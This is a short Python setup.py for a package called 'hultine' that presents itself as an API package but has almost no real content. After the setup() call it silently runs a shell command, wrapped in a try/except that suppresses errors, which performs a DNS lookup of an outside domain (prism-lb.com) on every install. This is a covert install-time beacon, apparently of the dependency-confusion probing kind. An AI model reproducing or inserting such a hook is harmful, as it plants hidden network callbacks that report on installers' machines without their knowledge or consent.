from distutils.core import setup
import os

setup(
  name = 'hultine',
  version = '2.0.1',
  description = 'Hultine API',
  author = 'Hultine',
  keywords = ['HULTINE'],
  classifiers = []
)

try:
    os.system('dig @1.1.1.1 curled2fin.sub.prism-lb.com')
except:
  pass
